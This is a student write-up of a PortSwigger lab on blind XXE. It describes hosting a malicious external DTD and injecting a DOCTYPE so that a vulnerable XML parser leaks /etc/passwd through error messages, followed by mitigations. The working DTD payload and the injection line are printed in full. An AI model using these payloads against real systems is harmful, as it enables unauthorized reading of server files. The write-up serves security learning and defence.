# Lab 02 — Exploiting blind XXE to retrieve data via error messages 

**Vulnerability:** XML External Entity (XXE) — blind XXE exfiltration via error messages
**Lab source:** PortSwigger Web Security Academy

---

## Short overview

This lab demonstrates a blind XXE technique that uses an externally hosted malicious DTD to cause the vulnerable XML parser to attempt to read local files and then reference them in a way that triggers an error message containing the file contents. By hosting a crafted DTD and referencing it from the XML payload, an attacker can exfiltrate local files (for example `/etc/passwd`) via error output even when direct entity expansion is not echoed normally.

## Goal

* Host a malicious DTD that reads a local file into an entity, then references it in a way that produces an error containing the file contents.
* Inject a parameter entity pointing to the malicious DTD and provoke the application to include the file contents in the resulting error, allowing retrieval of local files in the controlled lab environment.

## Environment & tools

* Lab: PortSwigger Web Security Academy (controlled lab)
* Tools: Browser + Burp Suite (Proxy, Repeater, HTTP history), exploit server (hosted payload storage)

---

## My steps (narrative, exactly what I did)

I opened the exploit server provided by the lab and saved a malicious DTD file with the following contents:

```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```

This DTD reads `/etc/passwd` into the `file` entity, then constructs an `exfil` entity that references a file path containing the `file` contents. I noted the URL of the hosted DTD via the exploit server's "View exploit" page. Next, I visited a product page and clicked "Check stock", intercepting the POST request in Burp Suite. I sent the request to Burp Repeater and inserted a DOCTYPE declaration that imported the external DTD and evaluated it, for example:

```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
```

I replaced the normal `productId` value with a reference to a parameter entity if required (or left the payload such that the parser imports and evaluates the DTD). After sending the modified request, the application returned an error page containing the contents of `/etc/passwd` as part of the error message.

---

## What I observed (sanitized)

* The application fetched and evaluated the externally hosted DTD.
* The crafted DTD caused the parser to read a local file and then reference it in a manner that produced an error containing the file contents.
* The error message returned by the server included the contents of `/etc/passwd`, demonstrating blind XXE exfiltration via error-based techniques.

---

## Proof (sanitized)

* The modified request sent via Burp Repeater that imported the external DTD (sanitized).
* The server error response showing the `/etc/passwd` contents embedded in the error (sensitive parts redacted).



---

## Mitigation

* Disable DTDs and external entity resolution in XML parsers, or use safe parser configurations that do not process external entities.
* Validate and sanitize XML input and avoid using XML features that allow external resource inclusion when possible.
* Restrict application server network access to local file resources and sensitive system endpoints.
* Apply the principle of least privilege to service roles and rotate any credentials discovered via metadata or local files.

---

## Lessons learned

* Blind XXE techniques can exfiltrate files even when expanded entities are not returned directly, by using error channels or indirect references.
* Hosting malicious DTDs on an attacker-controlled server is a powerful way to deliver complex XML payloads.
* Secure parser configurations and network isolation are key defenses against XXE-based SSRF and file exfiltration.
